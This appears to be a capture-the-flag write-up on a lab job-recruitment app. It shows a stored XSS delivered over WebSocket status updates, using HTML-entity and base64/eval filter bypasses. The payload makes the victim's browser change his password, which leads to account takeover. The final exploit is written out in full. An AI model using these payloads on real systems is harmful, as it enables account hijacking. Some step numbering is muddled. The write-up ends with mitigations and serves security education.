## Challenge Overview

**Objective:** Reset the password of a target user (Jeremy) by exploiting an XSS vulnerability that leverages WebSocket-based real-time updates to deliver the payload.

**Skills Required:**
- XSS exploitation
- WebSocket communication analysis
- HTML entity encoding/decoding
- Base64 obfuscation
- API endpoint discovery
- Account takeover (ATO)

## Step 1: Initial Reconnaissance

### Exploring the Application

The application is a job recruitment platform with two user roles:
- **Recruiters** – Can post job openings and review applications
- **Job Seekers** – Can apply to jobs and receive status updates

Initial exploration revealed:
- No direct messaging system between users
- No obvious interaction points with the target user (Jeremy)
- Traditional HTTP endpoints appeared well-protected

### Identifying the Attack Vector

After signing up as a **recruiter** and posting a job opening, an interesting behavior was observed:
- The page refreshed immediately
- A new applicant named **Jeremy** appeared automatically
- This indicated **real-time updates** via WebSockets

This became the critical observation: **Jeremy would receive real-time notifications about application status changes**.

## Step 2: Understanding WebSocket Communication

### WebSocket Flow

1. Recruiter accepts/rejects an application
2. Server pushes a WebSocket message to the applicant
3. Applicant's browser receives and renders the update instantly

### WebSocket Message Format

When updating an application status, the WebSocket message sent to the applicant was:

```
42["status_update",{"userId":4,"message":"Your application status has been updated to: accepted. Reason: [USER_INPUT]"}]
```

The `Reason` field was directly embedded in the message and rendered in the applicant's browser without proper sanitization.

## Step 3: Discovering the XSS Vulnerability

### Initial Testing

The `reason` field in the application status update was identified as a potential injection point. The server performed some stripping but had weaknesses.

**Test Payload:**
```json
{"status":"accepted","reason":"<svg onload=alert(1)>"}
```

**WebSocket Received:**
```
<svg onloadalert1>
```

**What was stripped:**
- `<` and `>` were removed
- `=` (equals sign) was stripped
- `(` and `)` parentheses were stripped

The server was decoding HTML entities before stripping, but certain characters were being filtered out.

### Finding the Bypass

Using **HTML entity encoding**, we could bypass the stripping:

**Working Test Payload:**
```json
{"status":"accepted","reason":"&lt;svg onload&#61;alert`1`&gt;"}
```

**WebSocket Received:**
```
<svg onload=alert`1`>
```

This executed successfully because:
- `&lt;` → `<`
- `&#61;` → `=`
- Backticks (`` ` ``) bypassed parentheses filtering
- Template literal syntax executed without parentheses

## Step 4: Developing the Exploit

### Goal: Change Jeremy's Password

Since the authentication cookie was `HttpOnly`, we couldn't steal it via `document.cookie`. Instead, we needed to make Jeremy's browser send a password change request using his active session.

### Finding the Password Change Endpoint

By changing our own password and monitoring the Network tab, we discovered:

**Endpoint:**
```
PUT /api/profile/password
Content-Type: application/json
```

**Request Body:**
```json
{"newPassword":"test123"}
```

### Initial Payload Attempt

```javascript
fetch('/api/profile/password', {
    method: 'PUT',
    headers: {'Content-Type': 'application/json'},
    body: '{"newPassword":"passme"}'
})
```

However, this contained problematic characters that were stripped: `'`, `"`, `(`, `)`, `=`.

## Step 5: Bypassing Character Filters with Base64

### The Solution: Base64 Encoding

By base64-encoding the JavaScript payload and using `atob()` + `eval()`, we could avoid all problematic characters.

**Step 1: Original JavaScript Payload**
```javascript
fetch('/api/profile/password',{method:'PUT',headers:{'Content-Type':'application/json'},body:'{"newPassword":"passme"}'})
```

**Step 2: Base64 Encoding**
```
ZmV0Y2goJy9hcGkvcHJvZmlsZS9wYXNzd29yZCcse21ldGhvZDonUFVUJyxoZWFkZXJzOnsnQ29udGVudC1UeXBlJzonYXBwbGljYXRpb24vanNvbid9LGJvZHk6J3sibmV3UGFzc3dvcmQiOiJwYXNzbWUifScp
```

**Step 3: Wrapping in XSS Payload**
```html
<img src=x onerror=eval(atob('BASE64_STRING'))>
```

**Step 4: HTML Entity Encoding**
```
&lt;img src&#61;x onerror&#61;eval&#40;atob&#40;'ZmV0Y2goJy9hcGkvcHJvZmlsZS9wYXNzd29yZCcse21ldGhvZDonUFVUJyxoZWFkZXJzOnsnQ29udGVudC1UeXBlJzonYXBwbGljYXRpb24vanNvbid9LGJvZHk6J3sibmV3UGFzc3dvcmQiOiJwYXNzbWUifScp'&#41;&#41;&gt;
```

## Step 6: Final Exploit

### Complete Payload

Send this in the `reason` field when updating Jeremy's application status:

```json
{"status":"accepted","reason":"&lt;img src&#61;x onerror&#61;eval&#40;atob&#40;'ZmV0Y2goJy9hcGkvcHJvZmlsZS9wYXNzd29yZCcse21ldGhvZDonUFVUJyxoZWFkZXJzOnsnQ29udGVudC1UeXBlJzonYXBwbGljYXRpb24vanNvbid9LGJvZHk6J3sibmV3UGFzc3dvcmQiOiJwYXNzbWUifScp'&#41;&#41;&gt;"}
```

### What Happens When Jeremy Receives It

1. **WebSocket Message:**
   ```
   42["status_update",{"userId":4,"message":"Your application status has been updated to: accepted. Reason: <img src=x onerror=eval(atob('...'))>"}]
   ```

2. **Browser Renders:**
   - `<img>` tag attempts to load `src=x` (fails)
   - `onerror` triggers
   - `atob()` decodes the base64 string
   - `eval()` executes the decoded JavaScript

3. **Fetch Request Sent (with Jeremy's HttpOnly cookie):**
   ```
   PUT /api/profile/password
   Cookie: token=[Jeremy's session]
   Content-Type: application/json
   
   {"newPassword":"passme"}
   ```

3. **Jeremy's Password Changes to `passme`**



## Step 7: Account Takeover

After sending the payload:

2. Log in with:
   - Username: `jeremy`
   - Password: `passme`
1. Access granted as Jeremy
2. Reset password or retrieve flag


## Technical Breakdown

### Why This Worked

| Obstacle | Bypass Method |
|----------|---------------|
| Character stripping (`<`, `>`, `=`, `(`, `)`) | HTML entity encoding (`&lt;`, `&gt;`, `&#61;`, `&#40;`, `&#41;`) |
| Parentheses filtering | Backticks for template literals, then Base64 to eliminate all problematic chars |
| `HttpOnly` cookie | Used victim's active session via fetch (browser sends cookie automatically) |
| Need for stealth | Base64 obfuscation to avoid WAF/detection |
| Real-time delivery | WebSocket pushed payload instantly without user interaction |

### Attack Chain Visualization

```
Recruiter (Attacker) → Posts Job → Jeremy Applies
         ↓
WebSocket Connection Established
         ↓
Attacker Sends XSS Payload in Reason Field
         ↓
Server Strips Some Chars (Entity Encoding Bypasses)
         ↓
WebSocket Message Delivered to Jeremy's Browser
         ↓
Payload Executes: fetch() with HttpOnly Cookie
         ↓
Password Change Request Sent as Jeremy
         ↓
Account Takeover Complete
```


## Key Takeaways

1. **WebSockets can be dangerous** – Real-time updates often lack proper sanitization compared to traditional HTTP responses

2. **HTML entity encoding bypasses naive stripping** – Servers may decode entities before filtering, creating injection opportunities

3. **Base64 + eval()** – A powerful combination for bypassing character filters while maintaining payload functionality

4. **HttpOnly cookies aren't a complete defense** – While they prevent theft via `document.cookie`, they don't prevent the browser from using them in authenticated requests

5. **Always check all input fields** – Even seemingly innocuous fields like a "reason" can become attack vectors


## Mitigation Recommendations

To prevent this vulnerability:

1. **Sanitize WebSocket messages** – Apply proper output encoding based on context
2. **Implement Content Security Policy (CSP)** – Restrict `eval()` and inline script execution
3. **Use CSRF tokens** – Even for state-changing requests (though HttpOnly cookies alone don't prevent CSRF)
4. **Validate and sanitize user input** – Use allowlists, not just stripping dangerous characters
5. **Treat WebSocket data like any other user input** – Don't assume it's safe because it's "real-time"
